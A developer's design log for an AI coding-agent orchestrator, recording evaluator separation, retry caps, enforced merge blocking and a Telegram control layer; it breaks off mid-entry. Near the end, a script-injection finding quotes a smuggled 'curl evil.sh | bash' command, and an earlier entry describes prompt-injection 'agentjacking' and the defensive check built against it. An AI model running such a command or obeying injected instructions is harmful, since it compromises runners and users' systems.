# Learning Log

A running, human-readable record of *why* Weapon X is built the way it is — decisions
made, alternatives rejected, and what actually using the loop teaches over time. This is
not the same thing as `memory/weaponx/MEMORY.md` (terse, machine-written facts the
orchestrator accumulates from runs) or `state/weaponx/` (one trace per task). This file is
for the slower, human-level lessons: design choices, course corrections, and things that
turned out to matter more or less than expected.

**Convention:** append new entries at the bottom, dated, newest at the end. Don't edit or
delete old entries even if they turn out to be wrong in hindsight — record the correction
as a new entry instead. The point is to preserve the actual history of how understanding
evolved, including the wrong turns, not to maintain a tidy "current truth" document (that's
what `CLAUDE.md` is for).

---

## 2026-06-30 — Initial design: from "not sure what to build" to a phased loop

Started from five YouTube videos (Spotify's Honk, an LLMOps/eval primer, Anthropic's
Managed Agents, Boris Cherny's Claude Code tips, and a reaction video on the Loop
Engineering moment) plus a Loop Engineering field-study PDF and the user's own prior
brainstorm on LLMOps/eval product gaps. Pulled transcripts via `yt-dlp` (audio captions,
not full frame-by-frame video analysis) specifically to keep the research phase token-light
— matches the project's own stated goal of token efficiency, so the research method and
the thing being researched were consistent from the start.

**Key decision: phase the build instead of going straight for the ambitious end-state.**
The user initially wanted all three trigger modes (on-demand, scheduled, always-on) and
all three task domains (code, content, research) from day one. Every real-world source
researched — especially Spotify, who runs this at the largest scale — only added
scheduling/parallelism *after* their verification step was proven trustworthy on simpler
cases. Recommended and got agreement on: build one domain-agnostic, on-demand orchestrator
first (Phase 1), defer scheduled discovery (Phase 2) and always-on/parallel (Phase 3).

**Key decision: generator/evaluator separation is the one piece that isn't optional.**
Every single source converged on this independently — Spotify's Honk, Anthropic's Jess
Yan, the LLMOps primer, the Loop Engineering paper. An agent grading its own work praises
it; a separate evaluator in a separate context, defaulting to "assume broken," does not
have that bias. Built as two distinct files (`weaponx` orchestrator vs.
`weaponx-evaluator` agent) from the start rather than one skill that both writes and
checks its own work.

**Key decision: safety gate = never auto-merge/deploy/publish, autonomy promotion is
manual-only.** The user chose this explicitly when offered an "auto-promote after clean
runs" alternative. Reasoning at the time: the drift/calibration tooling (Phase 1.5) is
designed to produce *evidence*, not *authority* — it tells a human when trust might be
warranted, it never grants itself more trust. This is the rule most worth re-reading
before ever touching it later, because the practical benefit of auto-promotion (less
babysitting) is exactly the kind of short-term convenience that's easy to rationalize and
hard to walk back once code is already merging itself.

**Round 2 feedback: "this is still mostly a runner + verifier."** The user pushed back
that a working loop isn't enough — the unaddressed gap is making it *measurable,
debuggable, and trustworthy to someone who doesn't want to babysit it*. This is what
turned a flat PASS/REJECT state file into a structured trace schema (failure taxonomy,
fixable-surface identification, confidence-tagged claims) and added Phase 1.5
(`weaponx-calibrate`, `weaponx-drift`, `weaponx-replay`) as an explicit, separately-scoped
layer — deliberately *not* folded into Phase 1's always-on behavior, because running
calibration checks per-task would double verification cost for a signal that isn't even
meaningful until enough runs have accumulated. Lesson: "make it trustworthy" and "make it
trustworthy on every single run" are different asks, and conflating them is exactly how
you get token blowout.

**Round 3 feedback: a "GOD tier" pass.** Added cross-task semantic memory
(`memory/weaponx/MEMORY.md`, separate from per-task state — durable facts vs. run
history), a skill self-improvement signal (drift detection can *suggest* a `CLAUDE.md`/
skill edit, never apply one — same manual-only principle as autonomy promotion, applied
to knowledge instead of permissions), dual-evaluator consensus for high-stakes tasks
(because a single evaluator is still a single point of failure until the next periodic
calibration check catches it — too late for something that already shipped), per-claim
confidence tagging (`verified` vs `asserted`, so a PASS doesn't imply more was checked
than actually was), proactive notification instead of silent waiting on a human gate, and
the engine/instance-data split (so the orchestrator itself, not just this project's task
history, is what gets open-sourced).

**What's still unproven, going in:** none of this has run against a real task yet. The
failure taxonomy, the retry cap of 4, the high-stakes trigger list — these are reasonable
starting guesses based on the research, not validated numbers. The first real runs should
be watched closely, and this log is exactly where to record if/when any of those defaults
turn out to be wrong.

## 2026-06-30 — First real run: a one-line bug fix, and two mechanism gaps found

Ran the loop end to end for the first time: a deliberately tiny, low-stakes fixture
(`sandbox/smoke-test/`, a one-character operator bug in `add()`). Chosen deliberately
small so any failure would be in the loop's *mechanism*, not obscured by task difficulty.
Result: clean PASS in 1 of 4 cycles, all evaluator claims `verified` rather than merely
`asserted`. Full trace: `state/weaponx/smoke-test-fix-add-2026-06-30-1600.md`.

Two real gaps surfaced immediately, both now recorded in `memory/weaponx/MEMORY.md` so
future runs don't rediscover them the hard way:

1. **The built-in `EnterWorktree` tool doesn't work in this repo yet.** It errored "not
   in a git repository" even though plain `git` commands worked fine in the same
   directory — root cause is almost certainly that it defaults to branching from
   `origin/<default-branch>`, and this repo has no `origin` configured yet (by design —
   it isn't pushed to GitHub). Fell back to `git worktree add` directly. This means Move
   2 (Handoff) as written in `SKILL.md` is *not yet accurate* about how isolation
   actually happens pre-GitHub — it should say so explicitly rather than presenting the
   tool call as though it always works. Left as a known gap rather than fixed immediately,
   since fixing it well probably means deciding whether Phase 1 should require a remote as
   a precondition at all, which is a real design question, not a typo.

2. **`gstack ship`'s PR step assumes a remote exists.** Same root cause. Didn't attempt
   to force it — instead, Persistence committed to a feature branch and left it unmerged,
   which is arguably the *correct* behavior for a repo that isn't on GitHub yet, not a
   workaround. Worth deciding explicitly later: is "commit to an unmerged branch, no PR"
   permanent graceful-degradation behavior for local-only use, or should Phase 1 assume a
   remote and treat its absence as a setup error? Left open on purpose — recording the
   question is more valuable right now than guessing at the answer from one data point.

**Lesson for next time:** both gaps were about the *scaffolding around* the loop (git
remote state), not the loop's actual reasoning — the five-move sequence, the
generator/evaluator separation, and the confidence tagging all worked exactly as designed
on the first try. That's a mild update against the pre-run worry that the failure
taxonomy or retry cap would need immediate rework; it's a point *for* the worry that
"what does Phase 1 assume about repo/remote state" wasn't specified clearly enough in the
original design and should be nailed down before the second run, ideally on a task where
it isn't a low-stakes local fixture.

## 2026-06-30 — Resolved: remote-or-not is a permanent branch, not a precondition

Closed the open question from the first run. Decision: `weaponx` never *requires* a
remote to function. Move 2 (Handoff) and Move 5 (Persistence) now check `git remote -v`
explicitly and branch: if `origin` exists, use `EnterWorktree` and gstack `ship`'s real
push/PR flow (the more correct path when it's available); if not, fall back to plain
`git worktree add` and stop at an unmerged local branch, and say so plainly rather than
treating it as a degraded outcome. Reasoning: this is a personal tool meant to be useful
from the first commit, before it's ever pushed anywhere — requiring a remote as a
precondition would mean it can't be smoke-tested or trusted locally before the user
decides to open-source it, which inverts the actual order of how this project is meant to
grow (prove it locally first, publish once it's proven). Encoded directly in
`.claude/skills/weaponx/SKILL.md` rather than left as a runtime judgment call, so future
runs don't have to rediscover this reasoning each time.

## 2026-06-30 — gstack: standalone dependency, not vendored; theory-alignment audit

User asked whether to clone gstack's source directly into this repo to "supercharge" the
loop. Recommendation given and taken: **standalone**, not vendored. Reasoning: the
engine/instance split exists specifically so `weaponx` stays portable; vendoring gstack
reverses that for no functional gain, since `weaponx` only ever calls gstack's skills, it
never needs to read or modify gstack's internals — and gstack is already installed and
available in this environment, so there was never actually a "download it" friction
problem to solve for this user, only for a hypothetical future fork without it (which
README documentation already covers, no runtime gate needed).

What the user actually valued was gstack's **principles and full end-to-end process** —
plain-outcome-first reporting, a wide catalog of well-scoped skills that compose. That
turned into two things: (1) rewriting Move 5's audit packet to lead with a plain-language
summary and push technical detail underneath, matching how gstack itself reports; (2)
auditing weaponx against all four research frameworks (the Loop Engineering paper, the AI
agent harness model, LLMOps, and eval) to find what was still missing, since the user
explicitly asked for that check rather than just taking the existing build on faith.

**Audit findings and fixes:**
- **Connectors (MCP) were entirely unaddressed** — the Loop Engineering paper's six parts
  include this explicitly (it decides "the loop's radius of vision") and nothing in
  `SKILL.md` said what to do when a task needs an external system. Added to Config,
  Discovery, and Generation: use whatever MCP connectors are already configured, don't
  build new integration code.
- **`BUDGET_CEILING` was discretion, not a number.** The paper is explicit that token
  blowout's guard is a *real* cap, not judgment. Set concrete starting defaults
  (~40 tool-calls/cycle, ~150/run) — flagged as unmeasured guesses to revise once real
  runs show whether they're too tight or too loose.
- **Comprehension rot had no guard at all.** The paper's defense is regular sampling —
  added `COMPREHENSION_SAMPLE_INTERVAL` (every 5th run) as a nudge in the plain-language
  summary, never a block.
- **gstack was underused relative to what it actually offers.** `investigate` now backs
  root-cause analysis when the same failure-taxonomy label repeats on a retry (instead of
  blindly retrying the same fix twice — this is the concrete mechanism that makes
  `hidden-retry-loop` actually catchable rather than just a label that exists);
  `handoff` now backs the Handoff move's task packaging; `context-save`/`context-restore`
  now back Persistence/Discovery's continuity; `retro` now backs the plain-language
  summary itself.

Everything else audited clean: harness-level concerns (memory, guardrails, notification)
and LLMOps-level concerns (trace, eval, diagnose, fix-and-redeploy) were already covered
by the original design. The gaps were specifically the parts of the theory that hadn't
come up yet in a single smoke-test run — a reminder that "it worked once" and "it matches
the theory" are different claims, and worth checking separately.

## 2026-06-30 — Second gap pass: four real ones, four smaller ones

Asked explicitly for another pass rather than assuming the first audit caught everything.
It didn't. The most important finding:

**The retry cap was silently bypassable.** `MAX_CYCLES` was written as a per-invocation
limit, so a task that hit `hit-retry-cap` could just be re-run and get a fresh budget for
free — which defeats the entire point of a hard cap being a circuit breaker. Fixed by
making `MAX_CYCLES` cumulative *per task*, not per invocation: Move 1 now carries the
cycle count forward from a prior capped trace, and if that carried-forward count already
meets the cap, the loop stops immediately and requires the human to explicitly raise it
rather than silently granting a new budget. General lesson worth remembering: any hard
cap needs to ask "what happens if the human just runs this again" — a cap that resets on
retry isn't actually a cap, it's a suggestion.

**Model-tiering was prose, not a mechanism.** The design has said since the first pass
that mechanical checks should run on a cheap model tier — but nothing ever told the
orchestrator to actually set `model: "haiku"` on the dispatch call, and the actual smoke
test confirmed it: neither sub-agent call used a model override. Fixed in Move 4 directly.
Lesson: a design document describing an intended behavior and a skill file instructing an
agent to perform that behavior are not the same thing, and the gap between them doesn't
show up until you check the actual tool calls a run made, not just whether the run
succeeded.

**No concurrency safety.** Two `/weaponx` invocations running at once had no protection
against colliding on worktree/branch names or racing on shared instance-data files. Fixed
with a same-task-slug collision check at the start of Handoff (numeric suffix on
collision) — deliberately lightweight, not a real locking system, since this is a
single-operator personal tool and the actual risk is low, but "low risk" isn't "no risk."

**Evaluator-b's independence relied on an instruction, not a guarantee.** It said "ignore
evaluator-a's output if you can see it" — which implies it might be visible at all. Fixed
by mandating parallel dispatch (both evaluators in the same message) so evaluator-b
structurally never has evaluator-a's output in its context, full stop.

**Smaller fixes, same pass:** mixed/ambiguous-domain tasks now get a named primary domain
plus an explicit call-out of the secondary component so Verification doesn't silently drop
half the task; `BUDGET_CEILING`'s tool-call count now explicitly includes the
orchestrator's own tool calls, not just sub-agents'; weak-PASS runs (majority `asserted`
claims) now get captured into `benchmark/weaponx/` tagged `weak-pass`, not just outright
rejections; and content pulled in through a connector is now explicitly flagged as
untrusted input, consistent with treating any fetched external content that way.

## 2026-06-30 — Retry-cap fix, verified for real (not just re-read and trusted)

Built a deliberately unsatisfiable fixture (two tests asserting contradictory outcomes for
the same input — no implementation can pass both) specifically so REJECT would be
guaranteed regardless of generator competence, then ran the exact bypass scenario the
earlier fix was supposed to close:

1. Invocation 1, `MAX_CYCLES=1`: generator correctly recognized the contradiction and
   made no changes rather than faking a pass. Evaluator (dispatched on the haiku tier —
   first real exercise of the model-tiering fix) independently confirmed REJECT.
   Cycle count hit 1/1 → `hit-retry-cap`, as expected.
2. Invocation 2, same task, same `MAX_CYCLES=1`: **this was the actual test.** Before the
   fix, this would have reset the cycle count to zero and spent a full second generate/
   verify cycle for free. Instead, Discovery found the prior `hit-retry-cap` trace,
   carried the cycle count forward, saw it already met the cap, and stopped immediately —
   zero sub-agent dispatches, zero cost. Confirmed correct.

One new, small finding from the run itself: the evaluator labeled this REJECT
`wrong-tool-choice` in its structured output, then explained in its own reasoning that
the real issue was task-impossibility — which is exactly what `other-with-detail` is for.
The taxonomy has the right category, the evaluator just didn't reach for it. Logged in
`memory/weaponx/MEMORY.md` as a durable fact rather than fixed by force — it's a one-off
labeling choice, not a structural problem, and one real data point isn't enough to justify
rewriting the evaluator's instructions yet. `benchmark/weaponx/retry-cap-double.md`
captures this specific case so `weaponx-calibrate` can later check whether the label
improves once there's more than one data point.

Also confirmed live: the notification-on-human-gate behavior was correctly *not* fired
during either invocation, because the notification tool's own guidance is explicit about
not paging someone who's clearly still watching — which was the right call here, but
worth remembering this hasn't yet been tested in a scenario where firing it actually was
the correct behavior (an unattended run). That's still an open validation gap, not a
closed one.

## 2026-06-30 — Remaining Phase 1 mechanisms pressure-tested

Closed out the rest of the untested paths from the second gap pass, three more real runs
plus two dry-runs of the Phase 1.5 tools:

**Model-tiering, PASS path.** `pass-path-fix` — a genuine off-by-one bug, unrelated to any
prior fixture — passed clean on cycle 1, evaluator on the haiku tier, every claim
`verified`. Combined with the retry-cap test's REJECT-path confirmation, model-tiering is
now validated on both outcomes, not just one.

**Parallel dual-evaluator consensus.** `high-stakes-discount-fix` — explicitly flagged
high-stakes by the user at invocation (the "user says so" trigger, not a protected-path
trigger). Both evaluators dispatched in the same message, both reached PASS independently
with zero disagreement — but the interesting result wasn't the agreement, it was that
evaluator B's risk-framed lens surfaced real findings (no bounds validation, float
precision on money, thin test coverage) that evaluator A's correctness-framed check
structurally could not have produced. That's a stronger validation of the design than a
forced disagreement would have been: it shows the two evaluators add independent value
even when they agree, not just when they don't. Consensus roughly doubled verification
cost versus a single evaluator (~31.6k vs ~15k tokens) — real, worth remembering when
deciding what actually qualifies as high-stakes, since it's not free.

**`weaponx-drift` dry run.** Correctly refused to report trends from 5 data points, most
of them deliberately engineered pressure-test fixtures rather than organic tasks. Flagged
that the 40% hit-cap rate would be misleading read at face value (both hit-caps are the
same intentionally-impossible task) and that the repeated `wrong-tool-choice` label
doesn't qualify as a cross-task recurring pattern under its own definition. This is the
tool behaving correctly under thin data, which was worth confirming before ever trusting
it under real data.

**`weaponx-calibrate` dry run.** Stopped immediately — one benchmark case exists, and
computing an "agreement rate" from n=1 would be actively misleading rather than just
unhelpful. Correct behavior per its own instructions. Real calibration signal needs
organic REJECTs/weak-PASSes from actual work, not more engineered-to-fail fixtures — worth
remembering not to pad the benchmark set artificially just to unblock this tool, since
that would defeat its purpose.

**State of Phase 1 + 1.5 after this pass:** every mechanism from both gap passes has now
been exercised at least once with a real run, not just re-read and trusted. The one
mechanism that still hasn't been tested in the scenario it's actually for is the
unattended notification path — can't test that honestly from inside an active
conversation, and it stays an open gap until there's a genuinely unattended run to
observe it on.

## 2026-06-30 — Phase 2 built: weaponx-discover

Moved to Phase 2 per direction, after (not instead of) finishing the Phase 1 pressure
testing above — deliberately in that order, consistent with the phased-rollout principle
this project keeps returning to: prove the loop before automating what feeds it.

**Design decision: discovery dispatches through the unmodified Phase 1 loop, not a
shortcut version of it.** Every candidate `weaponx-discover` finds gets handed to the
exact same `weaponx` skill a human would invoke by hand — same worktree isolation, same
generator/evaluator split, same retry cap, same never-merge boundary. Phase 2 only
automates *finding* work, not *shipping* it; the safety floor doesn't move. This was the
one design question worth deciding deliberately rather than defaulting: it would have been
easy to build a leaner, faster "just fix it" path for auto-discovered work on the theory
that it's lower-stakes since a human didn't ask for it specifically — that's backwards.
Auto-discovered work has *less* human context behind it than a hand-typed task, if
anything it deserves the same scrutiny, not less.

**Design decision: `MAX_CANDIDATES_PER_RUN` (default 3) is the Phase 2 equivalent of
`MAX_CYCLES`.** Without a hard cap on how many discovered candidates get dispatched in one
run, a discovery pass that finds a lot of plausible-looking work could fan out into an
expensive, unbounded batch — the token-blowout failure mode, one level up from the
per-task cap. Excess candidates get logged and deferred, not dropped.

**Design decision: excluded `sandbox/` from discovery sources explicitly.** This repo's
own pressure-test fixtures (the deliberately-broken `double()`, the contradictory tests)
would otherwise look exactly like real bugs to a naive commit/TODO scan. Discovering and
"fixing" them would be absurd — a good concrete example of why "find broken-looking code"
isn't the same as "find real work," and worth remembering if discovery sources ever expand.

**What's not done: scheduling is not activated.** The skill exists and runs on demand, but
nothing is invoking it on a cadence. Two reasons, both deliberate: (1) this repo has no
`origin` remote yet, so cloud scheduling (the more correct long-term answer, since it
doesn't need this machine to stay on) isn't available — same precondition already
documented for `ship`'s PR flow; local `/loop` is the only option right now, and it
requires the machine to stay on and expires after 7 days. (2) Turning on a recurring
trigger starts genuinely autonomous behavior that keeps running until someone turns it
off — that's a different category of action than building the skill, and activating it
silently would be exactly the kind of blast-radius mistake the whole safety model exists
to avoid making casually. Documented how to activate it in the skill file; not done
without a separate, explicit go-ahead.

## 2026-06-30 — First real (non-fixture) task, and it immediately justified itself

Directly called out: every run up to this point was a fixture built specifically to
demonstrate one mechanism. Pointed at real work instead — this repo's own missing
LICENSE, a genuine blocker to going public that had been identified in conversation but
not acted on. Correct instinct: the tool should be used on real problems, not asked about.

**It worked, and it found something no fixture would have.** The generator chose MIT
(correct, well-reasoned) but auto-filled the copyright holder from `git config`
(`dsvxmedia`) without treating it as a decision. Evaluator A verified internal consistency
(matches git config, matches canonical MIT text byte-for-byte) — PASS. Evaluator B
verified something categorically different — does this match who the user actually is —
and it didn't match this session's known identity, so REJECT. **First real disagreement
the loop has ever hit**, and it correctly escalated instead of averaging or picking a
side.

Turned out `dsvxmedia` was actually correct — confirmed by cross-referencing git remotes
across 6 of the user's other repos, all consistently under that GitHub account. But the
resolution matters as much as the finding: **an unconfirmed guess that happens to be right
is not the same as a verified fact**, and evaluator B was correct to block on it anyway.
This is the clearest validation yet of the whole verification-over-assumption philosophy
this project is built on — it would have been very easy to treat B's REJECT as a false
alarm once the value checked out, and that would have been the wrong lesson to take from
it. The value being correct doesn't retroactively make the unconfirmed version safe to
have shipped.

Logged as a durable fact in `memory/weaponx/MEMORY.md`: ambient config (git identity,
environment variables, etc.) is not a reliable source for anything that becomes
permanently public — treat it as a blocking question, not a plausible default, regardless
of how likely it is to be correct.

## 2026-06-30 — Branch cleanup, checked against a second opinion first

Before merging/cleaning up, ran the plan itself past `gstack`'s `plan-eng-review` for a
second opinion rather than just executing the first plan proposed. Worth doing — it
agreed with most of the plan but caught one real thing worth changing.

**Executed:**
- Merged `weaponx/add-license` into `main` (real, needed, double-verified — but caught
  along the way that the LICENSE/README changes had been *verified* by both evaluators
  but never actually *committed* in the worktree; committed before merging).
- Deleted `weaponx/smoke-test-fix` and `weaponx/pass-path-fix` outright — both were
  redundant demonstrations of the same thing (single-evaluator PASS on a fixed bug),
  and their record already lives in `state/weaponx/` traces.
- **Did not delete `weaponx/high-stakes-discount-fix` the same way**, per the second
  opinion's pushback: it's the one run that demonstrated something the other two didn't
  — two independent evaluators reaching agreement while still surfacing genuinely
  different information, which is the actual argument for running two evaluators at all,
  not just the disagreement-escalation path. Wrote it up as
  `docs/examples/high-stakes-dual-evaluator-consensus.md` before deleting the branch, so
  the substance survives even though the raw fixture code doesn't need to.

**General lesson, worth keeping:** "these are all the same kind of thing, clean them up
uniformly" was the wrong first instinct. Branches that look interchangeable from a
distance (all sandbox pressure-test fixtures) can differ in what they actually proved —
worth checking case by case before batch-deleting, rather than applying one rule to
everything that superficially matches a category.

Since nothing had ever been pushed to a remote, none of this touched any public history —
worth noting for next time this comes up: local branch cleanup pre-GitHub is close to
risk-free (git retains deleted commits via reflog for weeks regardless), which is part of
why the safe default is to prefer deleting over indefinitely accumulating exploratory
branches, rather than treating "keep everything just in case" as the safer choice.

## 2026-06-30 — Repo went public, then de-branded the front door

Created the GitHub repo (`dsvxmedia/Weapon-X`, public, MIT) and pushed. Shortly after,
asked to remove gstack branding from the public copy so the presentation centers on what
was actually built, not the dependency it's built on.

**Scope decision, deliberately narrow:** public-facing copy only (`README.md`,
`CLAUDE.md`) — not the functional engine. `weaponx/SKILL.md` and the evaluator agents
still call gstack skills directly for real work (QA, review, shipping, investigation);
removing those calls without replacing them would break verification entirely, which is
the one thing this project cannot afford to fake. De-branding the presentation and gutting
the engine are different requests, and conflating them would have been a real mistake.

**One deliberate exception, flagged rather than silently decided:** the README's
Prerequisites section keeps one functional mention of gstack, because it's genuinely a
setup requirement, not narrative credit — removing it would leave anyone forking the repo
with no explanation for why the tool fails until they install the right dependency.
Reworded to name it as "built and tested against," with a note that a comparable suite
should work with light edits, rather than presenting it as the only possible option.

**What didn't get touched, on purpose:** this file and `docs/specs/` still describe
gstack extensively, because both are accurate historical records of what actually happened
while building this, not living marketing copy. Scrubbing them would mean rewriting true
history to make the past look different than it was — which is exactly what this file's
own stated convention (append-only, don't edit old entries even in hindsight) exists to
prevent. If the public-facing story and the internal build history read differently now,
that's intentional: one is the presentation, the other is the record.

## 2026-06-30 — Tamper-evident traces built; four other suggestions deliberately deferred

External review (Perplexity, reading only the public repo) suggested seven upgrades.
Checked each against what's actually built before doing anything, since the reviewer
couldn't see the real implementation state, only the README:

**Already built, not new work:** continuous evaluator calibration (`weaponx-calibrate`
already does this, and correctly refuses to run on too little data), failure-to-benchmark
capture (already automatic on REJECT and weak-PASS), risk-aware gating (already the
`HIGH_STAKES_TRIGGERS` + dual-evaluator consensus mechanism). Worth knowing the outside
read was behind the actual state, not that these were wrong suggestions.

**Built now: tamper-evident trace chain.** Every trace in `state/weaponx/` now carries a
`**Chain:** prev=<sha256>` line pointing to the real, computed hash of the trace before
it, retrofitted across all 6 existing traces and made a permanent part of Move 5 going
forward. This doesn't prevent someone from editing an old trace, it makes the edit
detectable by breaking the chain. Picked as the one thing worth building immediately
because it's cheap, concrete, needs no additional run history to be meaningful, and
directly strengthens the exact claim the whole public write-up leans on: "here's the
proof." Before this, the proof was honest but not verifiable after the fact.

**Deliberately deferred, logged here so the reasoning survives even though the code
doesn't exist yet:**

- **Autonomy levels** (named tiers: observe / advise / act-with-approval / limited
  autonomous). The reviewer's top priority, ranked last here on purpose. This is a real
  safety-model design decision, not a quick feature, and there isn't enough run history
  yet (six runs, mostly engineered fixtures) to know what the tiers should actually gate.
  Building this now means guessing at boundaries with no evidence, on the one part of the
  system that can least afford to be guessed at. Revisit once there's a real body of runs
  to design against, not before.
- **Drift alerts** (proactive notification when retry rate / cost / reject rate crosses a
  threshold, on top of the existing on-demand `weaponx-drift` dashboard). Needs two things
  that don't exist yet: enough trace history for "drift" to mean something (five or six
  points isn't a trend, confirmed the one time `weaponx-drift` actually ran), and Phase 2
  scheduling turned on, which is its own deliberately-parked decision. Alerting on noise
  would be worse than not alerting.
- **Replay UI polish.** `weaponx-replay` has never been invoked once. Polishing the
  presentation of a feature nobody has used yet is backwards — use it first, then decide
  if the plain markdown report is actually insufficient before building something fancier
  on top of it.
- **Wider risk-gating vocabulary** (explicit payment-flow / compliance-sensitive triggers
  added to `HIGH_STAKES_TRIGGERS`, beyond protected-path / externally-visible / user-
  flagged). Small and cheap, genuinely just not done yet — lowest-priority of the four
  only because nothing in this project's real usage has hit that gap so far.
## 2026-06-30 — "Never merge" became enforced, not just instructed

A second external review (also via Perplexity, a longer and more grandiose one this
round) correctly named the real gap under all the ambition: the safety rules in this
project have always been prose the orchestrator is trusted to follow, not something
technically incapable of being violated. Everything else in that review, autonomy
escrow, trust portability across organizations, "machine governance infrastructure for
society", was set aside as premature framing for a six-run project (see below) — but
this one point was correct and worth acting on immediately.

**Built:** GitHub branch protection on `main` (`enforce_admins=true`, required PRs, no
force-push, no branch deletion), plus a local `.githooks/pre-push` hook that blocks a
direct push before it even reaches the network. Both were tested, not just configured
and trusted: a real commit, a real `git push origin main`, a real rejection from each
layer independently. GitHub's `GH006: Protected branch update failed` for the remote
layer; the hook's own message for the local layer. This is the difference between "the
agent promises not to merge" and "the agent's own tool calls cannot merge, regardless of
what it decides" — the second one doesn't depend on the orchestrator's judgment holding
up every single time.

**Why this, and not the rest of that review's list, right now:** it's the one item that
closes a real, already-identified gap (the difference between documented and enforced
safety) rather than opening a new, much bigger and unproven ambition. Cheap, testable,
done in under an hour. Everything else in that conversation, autonomy tiers, trust
scores portable across orgs, healthcare/compliance/public-sector applications, was
explicitly declined as a direction to build toward right now: interesting in the
abstract, but claiming any of it at this project's actual stage (six runs, one operator,
a few days old) would be a credibility problem, not a credibility asset, for the exact
audience (engineers) this project is trying to earn trust with. Recorded here so the
reasoning survives if the ambition resurfaces later: the right time to build toward it
is after there's a real body of evidence, not before.

## 2026-06-30 — Agentjacking check added; positioning re-grounded in current research

Before deciding what "GOD tier" should mean, did real research instead of taking the
ambition at face value: current public statements from Boris Cherny and Andrej Karpathy,
and current Hacker News / industry discussion on AI coding agents.

**Correction that changed the plan:** Karpathy's actual 2026 position is cautious, not
accelerationist — he calls current agents "brittle," says they can't really plan or
remember, and frames "agentic engineering" as a human discipline (spec design, diff
review, eval design) rather than a case for removing humans faster. "Pushing past" him
toward more autonomy would mean pushing past his own stated skepticism, not extending his
vision. Re-grounded the goal around making his actual discipline easier to do well, not
around outrunning it.

**Validation that reshaped the public copy:** the real, current, well-documented 2026
complaint about coding agents is that verification capacity, not generation speed, is the
bottleneck — one analysis found code churn up 861%, the incident-to-PR ratio up 242.7%,
and review time up 441.5%, with code now merging unread because reviewers can't keep pace.
That is exactly the problem this project's generator/evaluator split targets. Updated
`README.md`'s "Why" section and both the LinkedIn post and technical blog post in the
asset folder to lead with this, sourced, instead of the more abstract "agents grade their
own homework" framing alone.

**Built: an agentjacking check.** A real, named, current attack — instructions hidden in
data (a fetched page, a file, a dependency) get followed as if they were the task — with
no dedicated coverage before this. Added to `weaponx-evaluator.md` as an explicit check
run whenever a task touches a connector or third-party content, and added
`injected-instruction-compliance` as a new failure-taxonomy value, synced across
`weaponx/SKILL.md`'s taxonomy list and the connectors note. Chosen over the more
speculative items on every "GOD tier" list so far specifically because it's grounded in a
documented, current threat, not a projection of what governance-scale autonomy might
someday need.

**What this round confirms about the overall pattern:** every one of these external
"make it GOD tier" conversations has produced one real, buildable thing once separated
from the ambition around it, tamper-evident traces, enforced merge-blocking, now the
agentjacking check, and the ambition itself has never survived contact with "what does the
actual evidence support right now." That's worth trusting as a process, not just a
one-off: keep pressure-testing the vision against research and real run history rather
than either dismissing external ideas wholesale or building toward all of them at once.

---

## 2026-07-01 — PUSH: an optional Telegram human-in-the-loop layer, kept out of the core

Added PUSH (`.claude/skills/weaponx-push/`): plain-English checkpoints while a run is in
progress, and decision briefs at human-gates (retry-cap, evaluator disagreement, PR ready)
that the operator can answer from their phone to resume the loop. Two delivery paths — a
local long-poll bridge (`bin/push-bridge.sh`, curl + jq only) for when a session is running
on the operator's machine, and a GitHub Actions cold-start path (`push-poll.yml` +
`push-dispatch.yml`) for kicking off a task from a phone with no local session.

**Key decision: PUSH is gated entirely behind config, never a hard dependency.** The engine
must not gain a standing dependency on an external service. So PUSH is off unless
`TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` are both set; when unset, the bridge exits with
a "skipping" status and the loop behaves exactly as before. The wiring into Moves 4 and 5 is
strictly additive — the two new steps are clearly marked "optional, only if configured" and
run *in addition to* the existing `PushNotification`/trace behavior, never instead of it.
This is why the change touches how the loop *behaves* (new optional notifications) but does
not weaken any existing guarantee — worth logging here rather than only in git history.

**Key decision: PUSH lives outside the portable core, and is itself split.** The bridge
script + docs are reasonably portable (a fork can reuse them with the two env vars), but the
GitHub Actions workflows are specific to this repo's CI and its `weaponx-approval`
environment, so they're this instance's wiring, not reusable engine. CLAUDE.md's
engine-vs-instance paragraph now says exactly this.

**Never-auto-ship held on the cloud path too.** `push-dispatch.yml`'s ship step depends on
the `weaponx-approval` GitHub Environment (human required-reviewer), so the cold-start path
still can't ship without explicit human approval — the same boundary as the local path, kept
enforced rather than merely instructed. Deliberate known gap: the cross-job branch/PR
handoff in that ship step is a documented placeholder (the human-approval gate was wired
first, on purpose); see the note in the workflow and SETUP.md.

**Corrected a now-stale precondition.** `weaponx-discover`'s SKILL.md (and the main
orchestrator's Handoff/Persistence) previously assumed there was no `origin` remote. There
now is one (`dsvxmedia/Weapon-X`), so cloud scheduling is technically unblocked — updated the
discover skill to say so while staying honest that no discover-specific scheduled workflow is
turned on by default. (The main orchestrator's remote-conditional logic already branches on
whether a remote exists at runtime, so it stays correct as written.)

## 2026-07-01 — PUSH pressure test: three real bugs, one hard platform blocker, one process lesson

Asked to actually try to break PUSH end to end and fix what's found, then log it — not a
theoretical review, a live one against the real deployed n8n workflow and real Telegram bot.
Findings, in the order they matter:

**1. Script injection in `push-poll.yml` (found by grep, not by exploiting it).** The
"Trigger dispatch workflow" step interpolated `${{ steps.poll.outputs.task }}` — text
derived from an untrusted Telegram message — directly into a `run:` shell command via GHA
templating. That's literal text substitution before bash parses it: a task string
containing `` "; curl evil.sh | bash # `` would execute on the runner with that job's
`actions:write` permissions, not just become task text. `push-dispatch.yml` already avoided
this correctly (routes `TASK` through `env:`); `push-poll.yml` didn't get the same treatment
when it was written. Found by systematically grepping every `${{ }}` inside every `run:`
block across both workflow files rather than trusting memory of what was already checked —
that method is worth repeating any time a new workflow file touches untrusted input. Fixed:
routed through `env: TASK_TEXT`.

**2. The n8n bridge treated any message as a task, not just `/weaponx` commands.** The
Parse node's logic was `let task = text;` by default, only narrowing it if the message
happened to start with `/weaponx`. A bare "hey what's up" sent to the bot would have been
dispatched as a real task. Rewrote to strict opt-in: task is empty unless the first
whitespace-separated token is exactly `/weaponx` (case-insensitive), which the allow-list
`If` node already gates on. Verified via three synthetic webhook POSTs plus checking n8n's
own execution log afterward (not just the webhook's ack, which is uninformative — it always
returns "Workflow was started" regardless of what happens downstream) — all three correctly
stopped at the `If` node with none reaching Ack or the GitHub dispatch call.

**3. A failed GitHub dispatch call failed completely silently.** This is the bug the user's
own first real test hit: `push-dispatch.yml` didn't exist on `main` yet (still on the PR
branch), the dispatch call 404'd, and n8n just marked the execution as errored internally
with zero notification — the user got the "Got it, starting..." ack and then nothing,
because it errored on a completely separate node. Confirmed via n8n's execution log
